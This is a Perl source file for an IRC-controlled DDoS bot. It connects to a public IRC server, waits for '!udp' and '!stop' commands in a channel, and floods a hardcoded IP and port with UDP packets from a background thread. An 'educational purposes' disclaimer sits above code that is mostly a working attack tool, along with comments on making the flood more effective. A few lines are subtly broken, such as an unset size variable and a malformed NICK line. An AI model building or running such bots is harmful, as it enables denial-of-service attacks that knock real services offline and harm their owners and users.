# BOT for DDoS purposes
# This Bot is based on this scripts
# http://packetstorm.wowhacker.com/DoS/udp.pl
# http://www.go4expert.com/articles/irc-bot-perl-t11831/

# This script is used solely for educational purposes.
# Being prohibited its use for malicious purposes, such as DoS, DDoS or any criminal or malicious activity.
# The use of the script will be unique and exclusive responsibility of those who use it

# A more complete version of the script can be found in
# https://github.com/0r1g/irc-bot


# Object interface to socket communications
use IO::Socket;
# Perl interpreter-based threads
use threads;
use threads::shared;

# Thread used to run the subroutine
my $thr;
# Flag to stop the subroutine
my $interrupt :shared; 

#IRC parameters
my $channel = '#IRCchannel';
my $nick = 'Botnet';
my $user = 'Hey There, Im a Bot';

# UDP Flood subroutine (not a real function per se)
# To enhance the effectiveness of the attack, find out:
# - the size of the tcp connections backlog queue;
# - the time out period for the tcp connections.
sub udp_flood_attack
{
  print "=> UDP Flood Started\n";

  # Local variables (to the enclosing block)
  my ($ip, $port, $target_socket, $proto, $lower_bound, $rand, $size);

  # Target host, port and channel
  $ip = '192.168.1.1';
  $port = 80;

  # Converts the IP representation (from textual to packed binary)
  $iaddr = inet_aton("$ip");

  # Opens a socket
  #$proto = getprotobyname("udp");
  socket(target_socket, PF_INET, SOCK_DGRAM, 17);  
  #socket($target_socket, PF_INET, SOCK_DGRAM, $proto); #|| die "socket: $!";

  # UDP Flood
  while (1)
  {
    if ($interrupt) { print "=> UDP Flood Stopped\n"; return; }
    # Sleeping for a fraction of a second keeps the script 
    # from running to 100 cpu usage.
    #select(undef, undef, undef, 0.01);
    #$lower_bound = 4;
    #$rand = $lower_bound + int(rand(16));
    $size = $rand x $rand x $rand;
    send(target_socket, 0, $size, sockaddr_in($port, $iaddr));
  }
}

# Creates a new client. Timeout is defined in seconds.
my $con = IO::Socket::INET->new(
  PeerAddr  => 'irc.arcti.ca',
  PeerPort  => '6667',
  Proto     => 'tcp',
  Timeout   => '30'
) or die "Error! $!\n";

# Join the IRC
print $con "USER $user \r\n";
print $con "NICK $nick r\n";
print $con "JOIN $channel\r\n";

# IRC connection loop
while (my $answer = <$con>)
{
  # Show server reply
  print $answer;

  # Answer to ping requests (to keep connection alive)
  if ($answer =~ m/^PING (.*?)$/gi)
  {
    print "Replying with PONG ".$1."\n";
    print $con "PONG ".$1."\r\n";
  }

  # Starts the attack
  if ($answer =~ /!udp/)
  {
    if ($thr && $thr->is_running())
    {
      print $con "PRIVMSG $channel :UDP Flood is running...\r\n";
    }
    else
    {
      print $con "PRIVMSG $channel :UDP Flood started!\r\n";
      $interrupt = 0;
      $thr = threads->create('udp_flood_attack');
      $thr->detach();
    }
  }

  # Finishes the attack
  if ($answer =~ /!stop/)
  {
    if ($thr && $thr->is_running())
    {
      print $con "PRIVMSG $channel :UDP Flood stopped!\r\n";
      $interrupt = 1;
    }
    else
    {
      print $con "PRIVMSG $channel :Nothing to stop.\r\n";
    }
  }
}
